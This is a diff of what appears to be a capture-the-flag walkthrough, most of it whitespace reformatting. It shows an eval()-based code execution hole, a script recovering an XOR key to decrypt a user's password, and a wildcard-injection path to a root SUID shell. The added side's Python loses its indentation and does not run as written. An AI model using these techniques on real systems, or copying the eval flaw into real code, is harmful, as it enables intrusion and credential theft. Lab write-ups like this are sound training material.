@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 5000 | HTTP    |
+| 22 | SSH |
+| 5000 | HTTP |
 
 
 
@@ -24,49 +24,49 @@ As seen we got some math formulas we can use, also, we can get the source code, 
 
 ```
 ls -la
-.rw-r--r-- 3.5k samsepiol 19 Feb  2023 app.py
-.rw-r--r--  219 samsepiol 12 May  2022 bisection.py
-.rw-r--r--  149 samsepiol 12 May  2022 prime.py
-.rw-r--r--  284 samsepiol 12 May  2022 quadratic.py
-drwxr-xr-x    - samsepiol 19 Feb  2023 templates
+.rw-r--r-- 3.5k samsepiol 19 Feb 2023 app.py
+.rw-r--r-- 219 samsepiol 12 May 2022 bisection.py
+.rw-r--r-- 149 samsepiol 12 May 2022 prime.py
+.rw-r--r-- 284 samsepiol 12 May 2022 quadratic.py
+drwxr-xr-x - samsepiol 19 Feb 2023 templates
 ```
 
 If we analyze the source code from `app.py`, we can notice this interesting thing on a function named `bisect()`:
 
 ```python
 def bisect(xa,xb):
-    added = xa + " + " + xb
-    c = eval(added)
-    c = int(c)/2
-    ya = (int(xa)**6) - int(xa) - 1 #f(a)
-    yb = (int(xb)**6) - int(xb) - 1 #f(b)
-    
-    if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
-        root = 0
-        return root
-    else:
-        e = 0.0001 #When to stop checking, number is really small
+ added = xa + " + " + xb
+ c = eval(added)
+ c = int(c)/2
+ ya = (int(xa)**6) - int(xa) - 1 #f(a)
+ yb = (int(xb)**6) - int(xb) - 1 #f(b)
+ 
+ if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
+ root = 0
+ return root
+ else:
+ e = 0.0001 #When to stop checking, number is really small
 
-        l = 0 #Loop
-        while l < 1: #Endless loop until condition is met
-            d = int(xb) - c #Variable d to check for e
-            if d <= e: #If d < e then we break the loop
-                l = l + 1
-            else:
-                yc = (c**6) - c - 1 #f(c)
-                if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
-                    xb = c
-                    c = (int(xa) + int(xb))/2
-                elif yc < 0: #If (c) is negative then we switch the a variable instead
-                    xa = c 
-                    c = (int(xa) + int(xb))/2
-        c_format = "{0:.4f}"
-        root = float(c_format.format(c))
-        return root
+ l = 0 #Loop
+ while l < 1: #Endless loop until condition is met
+ d = int(xb) - c #Variable d to check for e
+ if d <= e: #If d < e then we break the loop
+ l = l + 1
+ else:
+ yc = (c**6) - c - 1 #f(c)
+ if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
+ xb = c
+ c = (int(xa) + int(xb))/2
+ elif yc < 0: #If (c) is negative then we switch the a variable instead
+ xa = c 
+ c = (int(xa) + int(xb))/2
+ c_format = "{0:.4f}"
+ root = float(c_format.format(c))
+ return root
 ```
 
 
-As  seen, this function uses `eval()`, this allows us to get `RCE`, The code constructs a stringÂ `added = xa + " + " + xb`Â and evaluates it viaÂ `c = eval(added)`. An attacker can craft malicious input forÂ `xa`Â orÂ `xb`Â to form a valid Python expression that executes arbitrary code.
+As seen, this function uses `eval()`, this allows us to get `RCE`, The code constructs a string`added = xa + " + " + xb` and evaluates it via`c = eval(added)`. An attacker can craft malicious input for`xa` or`xb` to form a valid Python expression that executes arbitrary code.
 
 We can now proceed to exploitation.
 
@@ -156,19 +156,19 @@ In our home directory, we can find this:
 ```bash
 bruce@devie:~$ ls -la
 total 44
-drwxr-xr-x 4 bruce bruce 4096 Feb 20  2023 .
-drwxr-xr-x 4 root  root  4096 May 12  2022 ..
-lrwxrwxrwx 1 root  root     9 May 13  2022 .bash_history -> /dev/null
--rw-r--r-- 1 bruce bruce  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 bruce bruce 3771 Feb 25  2020 .bashrc
-drwx------ 2 bruce bruce 4096 May 12  2022 .cache
--rw-r--r-- 1 root  root   158 Feb 19  2023 checklist
--rw-r----- 1 root  bruce   23 May 12  2022 flag1.txt
--rw-r--r-- 1 root  root   355 Feb 20  2023 note
--rw-r--r-- 1 bruce bruce  807 Feb 25  2020 .profile
--rw-rw-r-- 1 bruce bruce   75 May 12  2022 .selected_editor
-drwx------ 2 bruce bruce 4096 May 12  2022 .ssh
--rw------- 1 bruce bruce    0 May 12  2022 .viminfo
+drwxr-xr-x 4 bruce bruce 4096 Feb 20 2023 .
+drwxr-xr-x 4 root root 4096 May 12 2022 ..
+lrwxrwxrwx 1 root root 9 May 13 2022 .bash_history -> /dev/null
+-rw-r--r-- 1 bruce bruce 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 bruce bruce 3771 Feb 25 2020 .bashrc
+drwx------ 2 bruce bruce 4096 May 12 2022 .cache
+-rw-r--r-- 1 root root 158 Feb 19 2023 checklist
+-rw-r----- 1 root bruce 23 May 12 2022 flag1.txt
+-rw-r--r-- 1 root root 355 Feb 20 2023 note
+-rw-r--r-- 1 bruce bruce 807 Feb 25 2020 .profile
+-rw-rw-r-- 1 bruce bruce 75 May 12 2022 .selected_editor
+drwx------ 2 bruce bruce 4096 May 12 2022 .ssh
+-rw------- 1 bruce bruce 0 May 12 2022 .viminfo
 ```
 
 We can add our `id_rsa` key to `authorized_keys` and migrate to `ssh`, let's do it:
@@ -214,10 +214,10 @@ If we check our `sudo -l` privileges:
 ```bash
 bruce@devie:~$ sudo -l
 Matching Defaults entries for bruce on devie:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User bruce may run the following commands on devie:
-    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
+ (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
 ```
 
 We can run `/usr/bin/python3 /opt/encrypt.py` as gordon, let's check it out:
@@ -241,7 +241,7 @@ import base64
 import subprocess
 
 def xor_bytes(a, b):
-    return bytes([x ^ y for x, y in zip(a, b)])
+ return bytes([x ^ y for x, y in zip(a, b)])
 
 # Step 1: Use a known plaintext (12 'A's to match the encrypted password length)
 plaintext = "A" * 12
@@ -249,18 +249,18 @@ print(f"[*] Using plaintext: {plaintext}")
 
 # Step 2: Encrypt the plaintext using the script
 try:
-    output = subprocess.check_output(
-        f'echo "{plaintext}" | sudo -u gordon /usr/bin/python3 /opt/encrypt.py',
-        shell=True,
-        stderr=subprocess.STDOUT,
-        text=True
-    )
+ output = subprocess.check_output(
+ f'echo "{plaintext}" | sudo -u gordon /usr/bin/python3 /opt/encrypt.py',
+ shell=True,
+ stderr=subprocess.STDOUT,
+ text=True
+ )
 except subprocess.CalledProcessError as e:
-    print(f"[-] Error: {e.output}")
-    exit(1)
+ print(f"[-] Error: {e.output}")
+ exit(1)
 
 # Extract the base64 output (handle prompt text if present)
-encrypted_b64 = output.strip().split()[-1]  # Adjust based on actual output
+encrypted_b64 = output.strip().split()[-1] # Adjust based on actual output
 print(f"[+] Encrypted output: {encrypted_b64}")
 
 # Step 3: Decode the ciphertext
@@ -281,7 +281,7 @@ password = password_bytes.decode('utf-8', errors='ignore').strip()
 print(f"\n[+] Gordon's password: {passw
 ```
 
-The script first generates aÂ **known plaintext**, and uses the encryption tool to encode it. Since XOR encryption has a critical weakness,applying the same key twice cancels the encryption, the script compares the plaintext with its encrypted version to derive the secret XOR key. With the key extracted, the script then decrypts Gordon's encoded password (`NEUEDTIeN1MRDg5K`) by reversing the XOR operation. Finally, it decodes the result from Base64 to reveal the original password. This approach bypasses the need to directly access the encryption script or key, leveraging the predictable behavior of XOR to expose the hidden credentials.
+The script first generates a **known plaintext**, and uses the encryption tool to encode it. Since XOR encryption has a critical weakness,applying the same key twice cancels the encryption, the script compares the plaintext with its encrypted version to derive the secret XOR key. With the key extracted, the script then decrypts Gordon's encoded password (`NEUEDTIeN1MRDg5K`) by reversing the XOR operation. Finally, it decodes the result from Base64 to reveal the original password. This approach bypasses the need to directly access the encryption script or key, leveraging the predictable behavior of XOR to expose the hidden credentials.
 
 
 If we use the script, we get this:
@@ -307,17 +307,17 @@ We can see this on gordon's home:
 ```
 gordon@devie:~$ ls -la
 total 36
-drwxr-xr-x 5 gordon gordon 4096 May  4 20:29 .
-drwxr-xr-x 4 root   root   4096 May 12  2022 ..
-drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 backups
-lrwxrwxrwx 1 root   root      9 May 13  2022 .bash_history -> /dev/null
--rw-r--r-- 1 gordon gordon  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 gordon gordon 3771 Feb 25  2020 .bashrc
-drwx------ 2 gordon gordon 4096 May  4 20:29 .cache
--rw-r----- 1 root   gordon   21 Aug  2  2022 flag2.txt
--rw-r--r-- 1 gordon gordon  807 Feb 25  2020 .profile
-drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 reports
--rw------- 1 gordon gordon    0 May 12  2022 .viminfo
+drwxr-xr-x 5 gordon gordon 4096 May 4 20:29 .
+drwxr-xr-x 4 root root 4096 May 12 2022 ..
+drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 backups
+lrwxrwxrwx 1 root root 9 May 13 2022 .bash_history -> /dev/null
+-rw-r--r-- 1 gordon gordon 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 gordon gordon 3771 Feb 25 2020 .bashrc
+drwx------ 2 gordon gordon 4096 May 4 20:29 .cache
+-rw-r----- 1 root gordon 21 Aug 2 2022 flag2.txt
+-rw-r--r-- 1 gordon gordon 807 Feb 25 2020 .profile
+drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 reports
+-rw------- 1 gordon gordon 0 May 12 2022 .viminfo
 ```
 
 If we look both directories:
@@ -325,19 +325,19 @@ If we look both directories:
 ```bash
 gordon@devie:~$ ls -la backups/
 total 20
-drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 .
-drwxr-xr-x 5 gordon gordon 4096 May  4 20:29 ..
--rw-r--r-- 1 root   root     57 May  4 20:32 report1
--rw-r--r-- 1 root   root     72 May  4 20:32 report2
--rw-r--r-- 1 root   root    100 May  4 20:32 report3
+drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 .
+drwxr-xr-x 5 gordon gordon 4096 May 4 20:29 ..
+-rw-r--r-- 1 root root 57 May 4 20:32 report1
+-rw-r--r-- 1 root root 72 May 4 20:32 report2
+-rw-r--r-- 1 root root 100 May 4 20:32 report3
 
 gordon@devie:~$ ls -la reports/
 total 20
-drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 .
-drwxr-xr-x 5 gordon gordon 4096 May  4 20:29 ..
--rw-r--r-- 1    640 gordon   57 Feb 19  2023 report1
--rw-r--r-- 1    640 gordon   72 Feb 19  2023 report2
--rw-r--r-- 1    640 gordon  100 Feb 19  2023 report3
+drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 .
+drwxr-xr-x 5 gordon gordon 4096 May 4 20:29 ..
+-rw-r--r-- 1 640 gordon 57 Feb 19 2023 report1
+-rw-r--r-- 1 640 gordon 72 Feb 19 2023 report2
+-rw-r--r-- 1 640 gordon 100 Feb 19 2023 report3
 ```
 
 It seems like there is some sort of backup going in the background by the root user that backups the contents of the `report` directory but, it changes the `ownership` to root, let's use `pspy` to check if its true:
@@ -362,7 +362,7 @@ cd /home/gordon/reports/
 cp * /home/gordon/backups/
 ```
 
-As seen, this uses `*` to copy the contents of the `reports` directory to the `backups` directory, this is vulnerable to `wildcard injection` due to the `*` character being `unquoted`,  we can get a root shell by doing the following:
+As seen, this uses `*` to copy the contents of the `reports` directory to the `backups` directory, this is vulnerable to `wildcard injection` due to the `*` character being `unquoted`, we can get a root shell by doing the following:
 
 ```
 cd /home/gordon/reports/
@@ -376,13 +376,13 @@ Once the /usr/bin/backup triggers, we can now see the bash binary inside of the 
 ```
 gordon@devie:~/backups$ ls -la
 total 1180
-drwxrwx--- 2 gordon gordon    4096 May  4 21:06 .
-drwxr-xr-x 6 gordon gordon    4096 May  4 20:36 ..
--rwsr-xr-x 1 root   root   1183448 May  4 21:07 bash
--rwxrwxr-x 1 root   root        25 May  4 21:07 exploit.sh
--rw-r--r-- 1 root   root        57 May  4 21:07 report1
--rw-r--r-- 1 root   root        72 May  4 21:07 report2
--rw-r--r-- 1 root   root       100 May  4 21:07 report3
+drwxrwx--- 2 gordon gordon 4096 May 4 21:06 .
+drwxr-xr-x 6 gordon gordon 4096 May 4 20:36 ..
+-rwsr-xr-x 1 root root 1183448 May 4 21:07 bash
+-rwxrwxr-x 1 root root 25 May 4 21:07 exploit.sh
+-rw-r--r-- 1 root root 57 May 4 21:07 report1
+-rw-r--r-- 1 root root 72 May 4 21:07 report2
+-rw-r--r-- 1 root root 100 May 4 21:07 report3
 ```
 
 ![Pasted image 20250504160803.png](../../IMAGES/Pasted%20image%2020250504160803.png)
